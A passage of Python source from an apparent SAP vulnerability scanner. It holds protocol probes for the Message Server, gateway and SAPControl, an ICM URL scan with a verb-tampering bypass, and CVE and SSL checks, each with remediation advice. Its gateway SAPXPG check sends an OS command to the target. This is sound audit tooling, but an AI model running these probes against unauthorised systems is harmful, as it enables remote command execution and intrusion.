    nitrace = data[148]
    sys_service = struct.unpack("!I", data[149:153])[0]

    return {
        "client_name": client_name,
        "hostname": hostname,
        "service": service,
        "msgtype": msgtype,
        "hostaddrv4": hostaddrv4,
        "servno": servno,
        "status": status,
    }


def query_ms_server_list(host, port, timeout=5):
    """Query MS_SERVER_LST to get list of application servers."""
    servers = []
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((host, port))

        login = build_ms_login_anon()
        ni_send(sock, login)
        resp = ni_recv(sock, timeout)

        if len(resp) < 12 or resp[:12] != MS_EYECATCHER:
            sock.close()
            return servers

        anon_name = b"-" + b" " * 39
        # Send MS_SERVER_LONG_LIST (one-way) twice, then MS_SERVER_LST (request)
        long_list = build_ms_header(
            toname=b"MSG_SERVER" + b" " * 30,
            fromname=anon_name,
            flag=MS_FLAG_ONE_WAY,
            iflag=MS_IFLAG_SEND_NAME,
        )
        long_list += struct.pack("B", MS_OPCODE_SERVER_LONG_LIST)
        long_list += struct.pack("B", 0)
        long_list += struct.pack("B", 1)
        long_list += struct.pack("B", 0)

        ni_send(sock, long_list)
        ni_send(sock, long_list)

        # Now send MS_SERVER_LST as REQUEST
        srv_lst = build_ms_request(
            toname=b"MSG_SERVER" + b" " * 30,
            fromname=anon_name,
            opcode=MS_OPCODE_SERVER_LST,
            opcode_version=104,
            opcode_charset=3,
        )
        ni_send(sock, srv_lst)
        resp = ni_recv(sock, timeout)

        # Parse client records from response
        # The header is variable length, find end of header
        # MS header is at least 70 bytes, client records start after
        if len(resp) > 70:
            client_data = resp[70:]
            offset = 0
            while offset + MS_CLIENT4_SIZE <= len(client_data):
                record = parse_ms_client4(client_data[offset:offset + MS_CLIENT4_SIZE])
                if record and record["client_name"] and record["client_name"] != "-":
                    servers.append(record)
                offset += MS_CLIENT4_SIZE

        try:
            ni_send(sock, build_ms_logout())
        except Exception:
            pass
        sock.close()
    except Exception:
        try:
            sock.close()
        except Exception:
            pass
    return servers


def query_gw_monitor(host, port, cmd, timeout=5):
    """Send a gateway monitor command (SAPRFC v3) and return response."""
    result = {"accessible": False, "data": b"", "text": ""}
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((host, port))

        pkt = bytearray(64)
        pkt[0] = 0x03  # version=3
        pkt[1] = 0x09  # req_type=9 (MONITOR)
        pkt[2] = cmd   # monitor command
        ni_send(sock, bytes(pkt))

        resp = ni_recv(sock, timeout)
        result["accessible"] = True
        result["data"] = resp
        if resp:
            result["text"] = resp.decode("ascii", errors="ignore")
        sock.close()
    except Exception:
        try:
            sock.close()
        except Exception:
            pass
    return result


def scan_icm_urls(host, port, use_ssl=False, timeout=5, threads=10, verbose=False,
                  progress_callback=None, cancel_check=None):
    """Scan ICM HTTP(S) port for accessible URL paths (Metasploit-style).

    1. Probes a random URL to get server header and baseline 404 response
    2. Fetches URL prefixes from /sap/public/icf_info/urlprefix
    3. Scans all 1633 paths from the embedded wordlist in parallel
    4. For 401 responses, attempts HEAD verb tampering bypass
    5. Returns (results_list, server_header, url_prefixes)
    """
    results = []
    server_header = ""
    url_prefixes = []

    # Step 1: Probe a random URL to get server header and 404 baseline.
    # Try preferred scheme first, fall back to opposite if it fails
    # (port may be HTTPS even if labeled HTTP, or vice versa).
    schemes = ["https", "http"] if use_ssl else ["http", "https"]
    not_found_status = 404
    scheme = None
    for try_scheme in schemes:
        try:
            base_url = "%s://%s:%d" % (try_scheme, host, port)
            r = requests.get(
                base_url + "/sap/its/~_not_existing_test_url_9876543210",
                timeout=timeout,
                verify=False,
                allow_redirects=False,
            )
            server_header = r.headers.get("server", "")
            not_found_status = r.status_code
            scheme = try_scheme
            break
        except RequestException:
            continue
    if scheme is None:
        return results, server_header, url_prefixes
    base_url = "%s://%s:%d" % (scheme, host, port)

    # Step 2: Fetch URL prefixes from /sap/public/icf_info/urlprefix
    try:
        r = requests.get(
            base_url + "/sap/public/icf_info/urlprefix",
            timeout=timeout,
            verify=False,
            allow_redirects=False,
        )
        if r.status_code == 200 and r.text:
            for line in r.text.strip().split("\n"):
                line = line.strip()
                if not line:
                    continue
                # Parse PREFIX=<path>&CASE=<n> format
                for part in line.split("&"):
                    part = part.strip()
                    if part.upper().startswith("PREFIX="):
                        prefix = part[7:]
                        if prefix and prefix not in url_prefixes:
                            url_prefixes.append(prefix)
    except RequestException:
        pass

    # Step 3: Build full path list from embedded wordlist
    paths = decompress_icm_paths()

    # Add high-value SAP paths that may not be in the embedded wordlist
    path_set = set(paths)
    for sap_path, _desc in SAP_URL_PATHS:
        if sap_path not in path_set:
            paths.append(sap_path)
            path_set.add(sap_path)

    # Add discovered URL prefixes to scan list
    for prefix in url_prefixes:
        if prefix not in path_set:
            paths.append(prefix)
            path_set.add(prefix)

    # Step 4: Scan all paths in parallel
    def check_path(path):
        url = base_url + (path if path.startswith("/") else "/" + path)
        try:
            r = requests.get(
                url,
                timeout=timeout,
                verify=False,
                allow_redirects=False,
            )
            result = {
                "path": path if path.startswith("/") else "/" + path,
                "status_code": r.status_code,
                "content_length": len(r.content),
                "server": r.headers.get("server", ""),
                "redirect": r.headers.get("location", "") if r.status_code in (301, 302, 303, 307, 308) else "",
                "verb_tamper": False,
            }

            # Step 5: For 401 responses, try HEAD verb tampering bypass
            if r.status_code == 401:
                try:
                    r2 = requests.head(
                        url,
                        timeout=timeout,
                        verify=False,
                        allow_redirects=False,
                    )
                    if r2.status_code == 200:
                        result["verb_tamper"] = True
                        result["tamper_method"] = "HEAD"
                except RequestException:
                    pass

            return result
        except RequestException:
            return None

    scanned = 0
    total = len(paths)

    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {executor.submit(check_path, p): p for p in paths}
        for future in as_completed(futures):
            scanned += 1
            if progress_callback:
                progress_callback()
            if cancel_check and cancel_check():
                # Cancel remaining futures and bail out
                for f in futures:
                    f.cancel()
                break
            if verbose and scanned % 200 == 0:
                log_verbose("    URL scan %s:%d progress: %d/%d" % (host, port, scanned, total))
            result = future.result()
            if result is None:
                continue
            # Filter out standard 404/not-found responses
            if result["status_code"] == not_found_status:
                continue
            if result["status_code"] == 404:
                continue
            results.append(result)

    # Sort by status code, then path
    results.sort(key=lambda x: (x["status_code"], x["path"]))

    return results, server_header, url_prefixes


# ═══════════════════════════════════════════════════════════════════════════════
# SECTION 6: Vulnerability Checks
# ═══════════════════════════════════════════════════════════════════════════════

def check_gw_sapxpg(host, port, sid, hostname, command, timeout=5, instance=None):
    """Check for gateway SAPXPG vulnerability.

    Sends P1 (GW_NORMAL_CLIENT) + P2 (F_SAP_INIT) + P3 (SAPXPG_START_XPG_LONG).
    If the gateway accepts the connection and starts sapxpg, it's vulnerable.
    """
    finding = None
    if instance is None:
        instance = deduce_instance(port)
    if instance == "XX":
        # Cannot build valid gateway packets without a proper instance number
        return None

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((host, port))

        # P1: GW_NORMAL_CLIENT
        p1 = build_gw_p1(host, instance)
        ni_send(sock, p1)
        resp = ni_recv(sock, timeout)

        if b"*ERR*" in resp:
            sock.close()
            return None  # Gateway properly rejects

        # P2: F_SAP_INIT
        p2 = build_gw_p2(host)
        ni_send(sock, p2)
        resp = ni_recv(sock, timeout)

        if b"*ERR*" in resp:
            sock.close()
            return None  # Rejected at INIT

        # Extract conversation ID
        conv_id = None
        ascii_strings = extract_ascii_strings(resp, 8)
        for s in ascii_strings:
            if s.isdigit() and len(s) == 8:
                conv_id = s
                break

        if not conv_id:
            sock.close()
            return None

        # P3: SAPXPG_START_XPG_LONG
        p3 = build_gw_p3(conv_id, host, hostname, sid, instance,
                         "793", "T_75", "000", command, "")
        ni_send(sock, p3)
        resp = ni_recv(sock, timeout + 5)

        if b"*ERR*" in resp:
            sock.close()
            return None

        # Check for STRTSTAT = 'O' (OK, command executed)
        idx = resp.find(b"STRTSTAT")
        executed = False
        if idx >= 0:
            window = resp[idx:idx + 50]
            for i in range(len(window)):
                if window[i] == ord('O'):
                    executed = True
                    break

        if executed or conv_id:
            detail = "Gateway accepted SAPXPG connection (conv_id=%s)" % conv_id
            if executed:
                detail += " - command '%s' was EXECUTED" % command
            finding = Finding(
                name="Gateway SAPXPG Remote Command Execution",
                severity=Severity.CRITICAL,
                description=(
                    "The SAP Gateway at port %d allows unauthenticated registration "
                    "and execution of external programs via SAPXPG. An attacker can "
                    "execute arbitrary OS commands as <sid>adm." % port
                ),
                remediation=(
                    "Set gw/sim_mode=0 (or remove sim_mode=1), configure gw/reg_no_conn_info, "
                    "restrict gw/sec_info and gw/reg_info ACLs. Apply SAP Note 2824129."
                ),
                detail=detail,
                port=port,
            )

        sock.close()
    except Exception:
        try:
            sock.close()
        except Exception:
            pass
    return finding


def check_ms_internal_open(host, port, timeout=5):
    """Check if Message Server internal port allows anonymous login."""
    finding = None
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((host, port))

        login = build_ms_login_anon()
        ni_send(sock, login)
        resp = ni_recv(sock, timeout)

        if len(resp) >= 12 and resp[:12] == MS_EYECATCHER:
            # Try to dump info to verify anonymous access
            anon_name = b"-" + b" " * 39
            dump_payload = struct.pack("B", 2)       # dump_dest
            dump_payload += b"\x00" * 3              # dump_filler
            dump_payload += struct.pack("!I", MS_DUMP_RELEASE)  # dump_command
            dump_payload += b" " * 40                # dump_name
            req = build_ms_request(
                toname=b"MSG_SERVER" + b" " * 30,
                fromname=anon_name,
                opcode=MS_OPCODE_DUMP_INFO,
                opcode_version=0,
                opcode_charset=0,
                payload=dump_payload,
            )
            ni_send(sock, req)
            resp2 = ni_recv(sock, timeout)

            if len(resp2) > 114:
                text = resp2[114:].decode("ascii", errors="ignore")
                if "kernel release" in text.lower() or "compiled" in text.lower() or "release" in text.lower():
                    finding = Finding(
                        name="Message Server Internal Port Unprotected",
                        severity=Severity.HIGH,
                        description=(
                            "The SAP Message Server internal port %d accepts anonymous "
                            "connections and returns system information. An attacker can "
                            "register a rogue Application Server and pivot to trusted "
                            "gateway exploitation." % port
                        ),
                        remediation=(
                            "Restrict access to the MS internal port using e.g. a Firewall"
                        ),
                        detail="Anonymous MS_DUMP_RELEASE returned: %s" % text[:200].strip(),
                        port=port,
                    )

        try:
            ni_send(sock, build_ms_logout())
        except Exception:
            pass
        sock.close()
    except Exception:
        try:
            sock.close()
        except Exception:
            pass
    return finding


def check_ms_acl(host, port, timeout=5):
    """Check if MS ACL is enforced (MS_CHECK_ACL opcode)."""
    finding = None
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((host, port))

        login = build_ms_login_anon()
        ni_send(sock, login)
        resp = ni_recv(sock, timeout)

        if len(resp) < 12 or resp[:12] != MS_EYECATCHER:
            sock.close()
            return None

        anon_name = b"-" + b" " * 39
        req = build_ms_request(
            toname=b"MSG_SERVER" + b" " * 30,
            fromname=anon_name,
            opcode=MS_OPCODE_CHECK_ACL,
            opcode_charset=0,
        )
        ni_send(sock, req)
        resp = ni_recv(sock, timeout)

        # Parse response - opcode_error is at offset 111 (110=opcode, 111=opcode_error)
        if len(resp) > 111:
            opcode_error = resp[111]
            if opcode_error == MS_OPCODE_ERROR_OK:
                finding = Finding(
                    name="Message Server ACL Not Enforced",
                    severity=Severity.HIGH,
                    description=(
                        "The Message Server on port %d returned MSOP_OK for MS_CHECK_ACL, "
                        "indicating no ACL file is configured. Any host can register as "
                        "an Application Server." % port
                    ),
                    remediation=(
                        "Configure ms/acl_info with a proper ACL file. "
                        "Apply SAP Note 2828682."
                    ),
                    detail="MS_CHECK_ACL returned MSOP_OK (no ACL)",
                    port=port,
                )

        try:
            ni_send(sock, build_ms_logout())
        except Exception:
            pass
        sock.close()
    except Exception:
        try:
            sock.close()
        except Exception:
            pass
    return finding


def check_cve_2020_6287(host, port, use_ssl=False, timeout=5):
    """Check for CVE-2020-6287 (RECON - SAP LM Configuration Wizard).

    Sends HTTP HEAD to /CTCWebService/CTCWebServiceBean. If the endpoint
    returns HTTP 200, the Configuration Wizard is exposed without authentication.
    Based on https://github.com/chipik/SAP_RECON by Dmitry Chastuhin (@_chipik).
    Original finding: Pablo Artuso (@lmkalg), Yvan 'iggy' G (@_1ggy).
    """
    finding = None
    schemes = ["https", "http"] if use_ssl else ["http", "https"]
    for scheme in schemes:
        try:
            r = requests.head(
                "%s://%s:%d/CTCWebService/CTCWebServiceBean" % (scheme, host, port),
                headers={"User-Agent": "Mozilla/5.0"},
                timeout=timeout,
                verify=False,
                allow_redirects=False,
            )
            if r.status_code == 200:
                finding = Finding(
                    name="CVE-2020-6287 - RECON (LM Configuration Wizard)",
                    severity=Severity.CRITICAL,
                    description=(
                        "The /CTCWebService/CTCWebServiceBean endpoint on port %d "
                        "is accessible without authentication (HTTP 200). This allows "
                        "unauthenticated attackers to create administrative users and "
                        "achieve full system compromise (CVSS 10.0)." % port
                    ),
                    remediation=(
                        "Apply SAP Security Note 2934135 immediately. As a workaround, "
                        "restrict access to /CTCWebService/* paths and disable the "
                        "LM Configuration Wizard if not needed."
                    ),
                    detail="HEAD %s://.../CTCWebService/CTCWebServiceBean returned HTTP 200" % scheme,
                    port=port,
                )
                break
            elif r.status_code in (401, 403, 404):
                break  # Port accessible but endpoint not vulnerable
        except RequestException:
            continue
    return finding


def check_cve_2025_31324(host, port, use_ssl=False, timeout=5):
    """Check for CVE-2025-31324 (Visual Composer metadatauploader).

    Uses GET to verify the endpoint is actually served (not just a generic 200
    from SAPControl or other services). Also checks POST with 405 response.
    """
    finding = None
    schemes = ["https", "http"] if use_ssl else ["http", "https"]
    for scheme in schemes:
        try:
            # Use GET first to verify endpoint actually exists
            r = requests.get(
                "%s://%s:%d/developmentserver/metadatauploader" % (scheme, host, port),
                timeout=timeout,
                verify=False,
                allow_redirects=False,
            )
            # A real Visual Composer endpoint returns 200 (GET) or we can check POST
            if r.status_code in (200, 405):
                # Verify it's not a generic page by checking for SAPControl content
                body = r.text.lower()
                if "sapcontrol" in body or "wsdl" in body:
                    break  # SAPControl generic response, not VC
                finding = Finding(
                    name="CVE-2025-31324 / CVE-2025-42999 - Visual Composer Unauthenticated Upload",
                    severity=Severity.CRITICAL,
                    description=(
                        "The /developmentserver/metadatauploader endpoint on port %d "
                        "is accessible without authentication (HTTP %d). This allows "
                        "unauthenticated file upload leading to Remote Code Execution "
                        "(CVE-2025-31324, CVSS 10.0). When chained with the "
                        "deserialization flaw CVE-2025-42999 (CVSS 9.1), full "
                        "unauthenticated RCE is achieved." % (port, r.status_code)
                    ),
                    remediation=(
                        "Apply SAP Security Notes 3594142 and 3604119 immediately. "
                        "As a workaround, disable Visual Composer or restrict access "
                        "to /developmentserver/* paths."
                    ),
                    detail="GET %s://.../developmentserver/metadatauploader returned HTTP %d" % (scheme, r.status_code),
                    port=port,
                )
                break
            elif r.status_code in (401, 403, 404):
                break  # Port accessible but endpoint not vulnerable
        except RequestException:
            continue
    return finding


def check_sapcontrol_unprotected(host, port, use_ssl=False, timeout=5):
    """Check if SAPControl protected methods respond without authentication.

    GetProcessList, GetInstanceProperties, and GetSystemInstanceList are
    unprotected by default (SAP standard behaviour) and are NOT reported.
    Only methods beyond these three indicate a misconfiguration.
    """
    finding = None

    # Methods that are unprotected by default — not a finding
    default_unprotected = {
        "GetProcessList",
        "GetInstanceProperties",
        "GetSystemInstanceList",
    }

    # Methods that should be protected — finding if accessible.
    # Ordered with most commonly exposed / highest impact first.
    # Testing stops once MAX_PROBE methods are confirmed accessible
    # to avoid excessive scan time (~170 methods).
    extra_methods = [
        # High-impact: info disclosure & system control
        "GetVersionInfo",
        "GetAccessPointList",
        "GetEnvironment",
        "GetAlertTree",
        "GetAlerts",
        "GetStartProfile",
        "GetTraceFile",
        "GetLogFileList",
        "GetCallstack",
        "GetQueueStatistic",
        "GetSystemUpdateList",
        "GetProcessParameter",
        "ListLogFiles",
        "ListDeveloperTraces",
        "ListConfigFiles",
        "ListSnapshots",
        "ParameterValue",
        "ReadConfigFile",
        "ReadDeveloperTrace",
        "ReadLogFile",
        "ReadSnapshot",
        "ReadDirectory",
        "ReadFile",
        "ReadProfileParameters",
        "CheckParameter",
        "AnalyseLogFiles",
        "ConfigureLogFileList",
        # ABAP-specific
        "ABAPAcknowledgeAlerts",
        "ABAPCheckRFCDestinations",
        "ABAPGetComponentList",
        "ABAPGetSystemWPTable",
        "ABAPGetWPTable",
        "ABAPReadRawSyslog",
        "ABAPReadSyslog",
        # J2EE-specific
        "J2EEControlCluster",
        "J2EEControlComponents",
        "J2EEControlProcess",
        "J2EEDisableDbgSession",
        "J2EEEnableDbgSession",
        "J2EEGetApplicationAliasList",
        "J2EEGetCacheStatistic",
        "J2EEGetCacheStatistic2",
        "J2EEGetClusterMsgList",
        "J2EEGetComponentList",
        "J2EEGetEJBSessionList",
        "J2EEGetProcessList",
        "J2EEGetProcessList2",
        "J2EEGetRemoteObjectList",
        "J2EEGetSessionList",
        "J2EEGetSharedTableInfo",
        "J2EEGetThreadCallStack",
        "J2EEGetThreadList",
        "J2EEGetThreadList2",
        "J2EEGetThreadTaskStack",
        "J2EEGetVMGCHistory",
        "J2EEGetVMGCHistory2",
        "J2EEGetVMHeapInfo",
        "J2EEGetWebSessionList",
        "J2EEGetWebSessionList2",
        # Enqueue server
        "EnqGetLockTable",
        "EnqGetStatistic",
        "EnqRemoveLocks",
        "EnqRemoveUserLocks",
        # Gateway
        "GWCancelConnections",
        "GWDeleteClients",
        "GWDeleteConnections",
        "GWGetConnectionList",
        "GWGetClientList",
        # ICM
        "ICMGetCacheEntries",
        "ICMGetConnectionList",
        "ICMGetProxyConnectionList",
        "ICMGetThreadList",
        # Web Dispatcher
        "WebDispGetServerList",
        "WebDispGetGroupList",
        "WebDispGetVirtHostList",
        "WebDispGetUrlPrefixList",
        # HA / Cluster
        "HACheckConfig",
        "HACheckFailoverConfig",
        "HACheckMaintenanceMode",
        "HAFailoverToNode",
        "HAGetFailoverConfig",
        "HASetMaintenanceMode",
        # Instance lifecycle (critical — can start/stop systems)
        "InstanceStart",
        "InstanceStop",
        "RestartInstance",
        "RestartService",
        "RestartSystem",
        "Start",
        "StartBypassHA",
        "StartSystem",
        "Stop",
        "StopBypassHA",
        "StopService",
        "StopSystem",
        "Shutdown",
        "Bootstrap",
        "SendSignal",
        "ShmDetach",
        # PSE / Crypto
        "CheckPSE",
        "CreatePSECredential",
        "DeletePSE",
        "StorePSE",
        "UpdateInstancePSE",
        "UpdateSCSInstance",
        "UpdateSystem",
        "UpdateSystemPKI",
        "CheckUpdateSystem",
        # Snapshots
        "CreateSnapshot",
        "DeleteSnapshots",
        # Process parameters
        "SetProcessParameter",
        "SetProcessParameter2",
        # OS-level (critical)
        "OSExecute",
        # Monitoring agent methods
        "GetAgentConfig",
        "GetListOfMaByCusGrp",
        "GetMcInLocalMs",
        "GetMtesByRequestTable",
        "GetMtListByMtclass",
        "InfoGetTree",
        "MscCustomizeWrite",
        "MscDeleteLines",
        "MscReadCache",
        "MsGetLocalMsInfo",
        "MsGetMteclsInLocalMs",
        "MtChangeStatus",
        "MtCustomizeWrite",
        "MtDbsetToWpsetByTid",
        "MtDestroyMarkNTry",
        "MteGetByToolRunstatus",
        "MtGetAllToCust",
        "MtGetAllToolsToSet",
        "MtGetMteinfo",
        "MtGetTidByName",
        "MtRead",
        "MtReset",
        "PerfCustomizeWrite",
        "PerfRead",
        "PerfReadSmoothData",
        "ReferenceRead",
        "Register",
        "RequestLogonFile",
        "SnglmgsCustomizeWrite",
        "SystemObjectSetValue",
        "TextAttrRead",
        "ToolGetEffective",
        "ToolSet",
        "ToolSetRuntimeStatus",
        "TriggerDataCollection",
        "Unregister",
        "UtilAlChangeStatus",
        "UtilMtGetAidByTid",
        "UtilMtGetTreeLocal",
        "UtilMtReadAll",
        "UtilReadRawalertByAid",
        "UtilSnglmsgReadRawdata",
    ]

    MAX_PROBE = 10  # Stop after confirming this many accessible methods
    accessible_extra = []
    for method in extra_methods:
        result = query_sapcontrol_soap(host, port, method, use_ssl, timeout)
        if result.get("success"):
            accessible_extra.append(method)
            if len(accessible_extra) >= MAX_PROBE:
                break

    if accessible_extra:
        finding = Finding(
            name="SAPControl SOAP Interface Unprotected",
            severity=Severity.MEDIUM,
            description=(
                "The SAPControl SOAP interface on port %d responds to methods "
                "beyond the default unprotected set (GetProcessList, "
                "GetInstanceProperties, GetSystemInstanceList) without "
                "authentication. This exposes additional system configuration, "
                "version details, and operational data." % port
            ),
            remediation=(
                "Set service/protectedwebmethods = SDEFAULT or configure "
                "specific method restrictions. Apply SAP Note 1439348. "
                "See https://help.sap.com/docs/SUPPORT_CONTENT/si/3362959700.html"
                "?locale=en-US for details."
            ),
            detail="Accessible methods (beyond defaults): %s%s" % (
                ", ".join(accessible_extra),
                " (and likely more — stopped probing after %d)" % MAX_PROBE
                    if len(accessible_extra) >= MAX_PROBE else "",
            ),
            port=port,
        )
    return finding


def check_gw_monitor_open(host, port, timeout=5):
    """Check if gateway monitor commands return data without auth."""
    finding = None

    # Try READ_SEC_INFO (cmd=7)
    result = query_gw_monitor(host, port, 7, timeout)
    if not result["accessible"]:
        return None

    # Gateway is accessible - check if it returns actual data
    has_data = False
    detail_lines = []

    if len(result["data"]) > 0:
        has_data = True
        detail_lines.append("READ_SEC_INFO returned %d bytes" % len(result["data"]))

    # Try ACL_INFO (cmd=19)
    acl_result = query_gw_monitor(host, port, 19, timeout)
    if acl_result["accessible"] and len(acl_result["data"]) > 0:
        has_data = True
        detail_lines.append("ACL_INFO returned %d bytes" % len(acl_result["data"]))

    # Try READ_CONN_TBL (cmd=3)
    conn_result = query_gw_monitor(host, port, 3, timeout)
    if conn_result["accessible"] and len(conn_result["data"]) > 0:
        has_data = True
        detail_lines.append("CONN_TBL returned %d bytes" % len(conn_result["data"]))

    if has_data:
        finding = Finding(
            name="Gateway Monitor Commands Accessible",
            severity=Severity.MEDIUM,
            description=(
                "The SAP Gateway on port %d allows unauthenticated monitor "
                "commands that return data (security config, connections). "
                "This discloses gateway ACL configuration and active connections." % port
            ),
            remediation=(
                "Set gw/monitor=0 or configure gw/monitor_acl to restrict "
                "access to monitor commands. Apply SAP Note 2824129."
            ),
            detail="; ".join(detail_lines),
            port=port,
        )
    return finding


def check_ssl_versions(host, port, timeout=5):
    """Check which SSL/TLS protocol versions a server supports.

    Attempts a handshake with each protocol version (SSLv3 through TLS 1.3)
    using minimum_version/maximum_version to pin each test to a single version.
    Returns a dict of version_name -> supported (bool).
    """
    # Map display name -> (TLSVersion min, TLSVersion max, expected version() string)
    # Suppress DeprecationWarnings for accessing legacy SSL/TLS version enums
    protocols = []
    if hasattr(ssl, 'TLSVersion'):
        with warnings.catch_warnings():
            warnings.simplefilter("ignore", DeprecationWarning)
            protocols = [
                ("SSLv3",   ssl.TLSVersion.SSLv3,   ssl.TLSVersion.SSLv3,   "SSLv3"),
                ("TLSv1.0", ssl.TLSVersion.TLSv1,   ssl.TLSVersion.TLSv1,   "TLSv1"),
                ("TLSv1.1", ssl.TLSVersion.TLSv1_1, ssl.TLSVersion.TLSv1_1, "TLSv1.1"),
                ("TLSv1.2", ssl.TLSVersion.TLSv1_2, ssl.TLSVersion.TLSv1_2, "TLSv1.2"),
            ]
            if hasattr(ssl.TLSVersion, 'TLSv1_3'):
                protocols.append(
                    ("TLSv1.3", ssl.TLSVersion.TLSv1_3, ssl.TLSVersion.TLSv1_3, "TLSv1.3"))

    results = {}
    for name, min_ver, max_ver, expected_str in protocols:
        try:
            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            # Lower security level to allow probing legacy protocols (SSLv3, TLS 1.0/1.1).
            # Without this, system-wide OpenSSL policy blocks old versions even when
            # minimum_version/maximum_version are explicitly set.
            ctx.set_ciphers("DEFAULT:@SECLEVEL=0")
            with warnings.catch_warnings():
                warnings.simplefilter("ignore", DeprecationWarning)
                ctx.minimum_version = min_ver
                ctx.maximum_version = max_ver

            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            sock.connect((host, port))
            wrapped = ctx.wrap_socket(sock, server_hostname=host)
            actual = wrapped.version() or ""
            wrapped.close()
            results[name] = (expected_str in actual)
        except (ssl.SSLError, socket.error, OSError):
            results[name] = False
        except Exception:
            results[name] = False

    return results


def check_weak_ssl(host, port, timeout=5, ssl_required=False):
    """Check for weak SSL/TLS versions on an HTTPS port.

    Returns a Finding if SSLv3, TLS 1.0, or TLS 1.1 are supported,
    or if the port requires SSL but no version can be negotiated
    (indicating very old/incompatible SSL configuration).
    """
    versions = check_ssl_versions(host, port, timeout)
    if not any(versions.values()):
        if ssl_required:
            # Port returned "Illegal SSL request" on HTTP but no SSL version works.
            # This means the server uses SSL/TLS versions or ciphers too old for
            # the local OpenSSL library (likely SSLv2/SSLv3 with legacy ciphers).
            return Finding(
                name="Obsolete SSL/TLS Configuration",
                severity=Severity.HIGH,
                description="Port %d requires SSL/TLS but rejects all modern protocol "
                            "versions (TLS 1.0 through 1.3). The server likely only "
                            "supports SSLv2 or SSLv3 with legacy ciphers that are no "
                            "longer available in modern SSL libraries." % port,
                remediation="Upgrade the SAP ICM SSL configuration to support at least "
                            "TLS 1.2. Update the server's PSE/certificate and configure "
                            "ssl/ciphersuites to use modern cipher suites.",
                detail="Server responded HTTP 400 'Illegal SSL request' on plaintext, "
                       "but SSL handshake failed for all tested versions (SSLv3-TLS1.3). "
                       "The SSL configuration is incompatible with modern clients.",
                port=port,
            )
        return None  # Could not connect at all

    weak = []
    ok = []
    for name in ("SSLv3", "TLSv1.0", "TLSv1.1"):
        if versions.get(name):
            weak.append(name)
    for name in ("TLSv1.2", "TLSv1.3"):
        if versions.get(name):
            ok.append(name)

    supported_str = ", ".join(
        "%s: %s" % (name, "YES" if supported else "no")
        for name, supported in versions.items()
    )

    if weak:
        return Finding(
            name="Weak SSL/TLS Protocol Version Supported",
            severity=Severity.HIGH if "SSLv3" in weak else Severity.MEDIUM,
            description="Port %d supports deprecated SSL/TLS protocol version(s): %s. "
                        "These are vulnerable to known attacks (POODLE, BEAST, etc.)." % (
                            port, ", ".join(weak)),
            remediation="Disable SSLv3, TLS 1.0, and TLS 1.1 in the SAP ICM/server "
                        "configuration. Only allow TLS 1.2 and TLS 1.3. "
                        "Set ssl/ciphersuites and ssl/client_ciphersuites accordingly.",
            detail="Supported versions: %s" % supported_str,
            port=port,
        )
    return None


def check_diag_login_info_leak(instance):
    """Check if the DIAG login screen exposes system information.

    If the SAP dispatcher login screen (port 32NN) returns system info such as
    DBNAME, CPUNAME, CLIENT, KERNEL_VERSION etc., this constitutes an information
    disclosure vulnerability. Attackers can use this to enumerate SIDs, hostnames,
    and kernel versions without authentication.

    Only reports a finding when the SCREEN_INFO field contains data (i.e. the
    login screen shows a visible system description to users).

    Returns a Finding (INFO) if SCREEN_INFO was scraped, else None.
    """
    # Only report when there is actual screen text visible on the login page
    screen_info = instance.info.get("diag_SCREEN_INFO", "")
    if not screen_info:
        return None

    diag_keys = [(k, v) for k, v in sorted(instance.info.items())
                 if k.startswith("diag_") and v]

    disp_svc = instance.services.get("dispatcher")
    port = disp_svc["port"] if disp_svc else 0

    detail_parts = []
    for k, v in diag_keys:
        field_name = k[5:]  # strip "diag_" prefix
        detail_parts.append("%s = %s" % (field_name, v))

    return Finding(
        name="SAP DIAG Login Screen Information Disclosure",
        severity=Severity.INFO,
        description=(
            "The SAP dispatcher login screen on port %d exposes system "
            "information via the DIAG protocol without authentication. "
            "An attacker can enumerate SID, hostname, client, kernel "
            "version, and GUI theme by initiating a DIAG connection." % port
        ),
        remediation=(
            "Restrict network access to SAP dispatcher ports (32NN). "
            "Consider placing a SAProuter or firewall in front of "
            "dispatcher ports to limit direct DIAG access."
        ),
        detail="; ".join(detail_parts),
        port=port,
    )


def check_icm_info_leak(host, port, use_ssl=False, timeout=5):
    """Check if /sap/public/info is accessible."""
    finding = None
    info = query_sap_public_info(host, port, use_ssl, timeout)
    if info.get("accessible"):
        detail_parts = []
        for key in ["RFCSYSID", "RFCDEST", "RFCDBHOST", "RFCDBSYS",
                     "RFCKERNRL", "RFCOPSYS", "RFCSAPRL"]:
            if key in info:
                detail_parts.append("%s=%s" % (key, info[key]))

        finding = Finding(
            name="SAP System Information Disclosure (/sap/public/info)",
            severity=Severity.LOW,
            description=(
                "The /sap/public/info endpoint on port %d exposes system "
                "information including SID, database host, kernel version, "
                "and memory details." % port
            ),
            remediation=(
                "Set icm/HTTP/auth_0 to restrict access to /sap/public/info, "
                "or disable the endpoint via SICF transaction."
            ),
            detail="; ".join(detail_parts) if detail_parts else "Endpoint accessible",
            port=port,
        )
    return finding


# Minimum fixed versions for CVE-2021-21475 per SP level.
# Versions below these thresholds are vulnerable.
_MDM_CVE_2021_21475_FIXES = {
    16: 17,
    17: 14,
    18: 16,
    19: 8,
    20: 5,
    21: 0,
}


def check_cve_2021_21475(mdm_version_str):
    """Check for CVE-2021-21475 (SAP MDM missing authorization).

    Parses the MDM version string (e.g. "Version 7.1 (7.1.16.220 Win64)")
    and checks whether the SP/patch level is below the fix threshold.
    Returns a Finding if vulnerable, else None.
    """
    if not mdm_version_str:
        return None

    # Extract detailed version from parenthesised part: "7.1.SP.PATCH ..."
    m = re.search(r'(\d+)\.(\d+)\.(\d+)\.(\d+)', mdm_version_str)
    if not m:
        return None

    major, minor, sp, patch = int(m.group(1)), int(m.group(2)), int(m.group(3)), int(m.group(4))

    # Only applies to MDM 7.1
